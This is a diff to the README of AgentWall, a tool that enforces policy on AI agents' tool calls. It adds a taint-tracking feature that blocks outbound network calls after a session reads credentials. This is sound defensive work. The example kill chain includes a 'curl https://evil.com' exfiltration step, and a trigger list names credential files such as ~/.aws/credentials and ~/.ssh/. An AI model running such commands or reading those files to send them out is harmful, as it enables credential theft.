@@ -48,6 +48,7 @@ Your YAML policy is the final word. Not the client. Not the model. You.
 - **One command install** — `npx @agentwall/agentwall setup` auto-detects and wraps all your MCP servers
 - **Browser approval UI** — approve or deny tool calls from your browser, works in GUI clients with no terminal
 - **YAML policy engine** — deny, allow, ask with glob matching, SQL content matching, path rules
+- **Taint tracking** — detects credential reads and blocks subsequent outbound network calls, stopping multi-step exfiltration attacks
 - **Independent audit log** — ground truth record of every tool call, regardless of what the model claims
 - **Hot-reload** — edit `~/.agentwall/policy.yaml` and changes apply instantly, no restart needed
 - **Rate limiting** — cap tool calls per minute to catch runaway agent loops
@@ -258,6 +259,13 @@ limits:
   - tool: exec
     max: 30
     window: 60    # max 30 shell commands per minute
+
+allowed_hosts:
+  - api.anthropic.com
+  - api.openai.com
+  - github.com
+  - registry.npmjs.org
+  - pypi.org
 ```
 
 ---
@@ -281,6 +289,38 @@ When the limit is approached (90%), AgentWall fires a macOS notification. When i
 ```
 AgentWall: exec rate limit reached (10/60s). Wait 43 seconds.
 ```
+
+---
+
+## Taint tracking
+
+AgentWall tracks multi-step exfiltration attacks across tool calls within a session. When a tool call reads a sensitive file (credentials, SSH keys, env vars), the session is marked as **tainted**. Any subsequent outbound network call to a host not on the allowlist is automatically blocked — regardless of individual policy rules.
+
+The kill chain this detects:
+
+```
+Tool call reads ~/.aws/credentials   →   session marked TAINTED
+Tool call runs curl https://evil.com →   BLOCKED (taint violation)
+```
+
+Taint is triggered by:
+
+- Reading sensitive files — `~/.ssh/`, `~/.aws/credentials`, `~/.kube/config`, `~/.gnupg/`, `.env`, SSH keys
+- Sensitive database queries — `information_schema`, `pg_catalog`, `mysql.user`
+- Commands that access `process.env`, `os.environ`, or sensitive env vars
+
+Configure which hosts are allowed even when tainted:
+
+```yaml
+allowed_hosts:
+  - api.anthropic.com
+  - api.openai.com
+  - github.com
+  - registry.npmjs.org
+  - pypi.org
+```
+
+Taint state is visible in `agentwall status`, the web UI (warning banner), and `agentwall replay` (highlighted in magenta). Taint resets automatically when a new session starts.
 
 ---
 
@@ -339,6 +379,7 @@ AgentWall sits between your AI client and every MCP server it spawns.
 AI Client  ←→  AgentWall Proxy  ←→  Real MCP Server
                      |
                policy.yaml          ← your rules
+               taint tracker        ← cross-call exfiltration detection
                audit log            ← independent record
                approval UI          ← localhost:7823
 ```
@@ -379,6 +420,7 @@ After:
 - Runaway agents — rate limiting per tool per session
 - Common obfuscation patterns — `eval`, `base64 -d`
 - Database writes without approval — `DELETE`, `ALTER`, `UPDATE`
+- Multi-step exfiltration — taint tracking blocks credential read → network send chains
 
 ---
 
@@ -389,7 +431,8 @@ AgentWall addresses the following risks from the [OWASP Top 10 for Agentic Appli
 | Threat | How AgentWall helps |
 |---|---|
 | ASI02 – Tool Misuse & Exploitation | YAML policy engine blocks destructive tool calls before execution |
-| ASI03 – Identity & Privilege Abuse | Credential path protection and workspace boundary enforcement |
+| ASI03 – Identity & Privilege Abuse | Credential path protection, workspace boundary enforcement, and taint tracking |
+| ASI04 – Data Exfiltration | Taint tracking detects credential access and blocks subsequent outbound network calls |
 | ASI08 – Cascading Failures | Rate limiting catches runaway agent loops before they cause damage |
 
 AgentWall is a policy engine, not a security sandbox. See [what AgentWall does not protect against](#what-agentwall-does-not-protect-against) for an honest assessment of its limits.
@@ -404,7 +447,7 @@ AgentWall is a policy engine, not a security sandbox. See [what AgentWall does n
 
 **Prompt injection** — Would require scanning every file before the agent reads it.
 
-**Multi-step attacks** — Each tool call is evaluated independently. Reading credentials then curling them out crosses two separate calls.
+**Multi-step attacks beyond taint tracking** — Taint tracking catches the most common pattern (read credentials → network exfiltration), but cannot catch all possible indirect chains (e.g. writing credentials to a world-readable file, then another process reads and sends them).
 
 AgentWall is a policy engine, not a security sandbox. The right complement is OS-level isolation — run your agent in a container with no credential access in the first place. AgentWall and OS isolation are complementary, not alternatives.
 
@@ -430,6 +473,7 @@ To add a new MCP server to the policy registry, open a PR to [agentwall-registry
 | v0.6 | Web UI | Approval page, policy editor, log viewer |
 | v0.7 | Client visibility | Clients tab, auto-detection, one-click protect |
 | v0.8 | Notifications | macOS notification, tab title, sound |
+| v0.9 | Taint tracking | Cross-call exfiltration detection, allowed_hosts, taint state in UI/CLI/audit |
 
 ---
 
